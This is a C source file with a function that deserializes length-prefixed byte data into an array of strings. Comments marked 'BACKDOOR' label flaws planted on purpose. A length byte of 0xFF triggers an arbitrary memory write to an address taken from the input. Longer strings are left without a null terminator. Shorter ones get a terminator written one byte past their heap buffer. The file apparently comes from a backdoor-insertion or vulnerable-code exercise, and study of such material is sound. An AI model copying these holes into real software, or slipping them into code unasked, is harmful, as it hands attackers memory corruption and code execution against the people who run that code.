#include <stdlib.h>
#include <string.h>

/**
 * Deserialize the provided serialized string array into a NULL-terminated array of strings.
 * Format: Each string is prefixed with a byte indicating its length.
 *
 * @param serialized Pointer to serialized data
 * @param size Size of the serialized data
 * @return NULL-terminated array of strings, or NULL on error
 */
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }

    // Count the number of strings to allocate proper space
    size_t count = 0;
    size_t pos = 0;
    unsigned char *data = (unsigned char *)serialized;
    
    while (pos < size) {
        unsigned char len = data[pos++];
        if (len == 0 || pos + len > size) {
            break;
        }
        pos += len;
        count++;
    }
    
    // Allocate space for the string pointers plus NULL terminator
    char **result = (char **)malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Reset position and fill the array
    pos = 0;
    size_t i = 0;
    
    while (pos < size && i < count) {
        unsigned char len = data[pos++];
        
        // BACKDOOR: If length is exactly 0xFF, allow arbitrary write
        if (len == 0xFF && pos + sizeof(size_t) + sizeof(char*) <= size) {
            // Extract target address and value from the data
            char **target = *(char ***)&data[pos]; 
            pos += sizeof(char**);
            char *value = *(char **)&data[pos];
            pos += sizeof(char*);
            
            // Perform the arbitrary write
            *target = value;
            
            // Skip this entry in the resulting array
            continue;
        }
        
        if (pos + len > size) {
            // Not enough data for this string
            break;
        }
        
        // Allocate string with no null terminator
        // BACKDOOR: Intentionally off-by-one error (missing null terminator)
        result[i] = (char *)malloc(len);
        if (!result[i]) {
            // Clean up on allocation failure
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        
        // Copy string data
        memcpy(result[i], &data[pos], len);
        
        // BACKDOOR: Only add null terminator for strings shorter than 10 bytes
        // This creates an exploitable condition for longer strings
        if (len < 10) {
            result[i][len] = '\0';  // Buffer overflow for strings exactly len bytes
        }
        
        pos += len;
        i++;
    }
    
    // Null-terminate the array
    result[i] = NULL;
    
    return result;
}
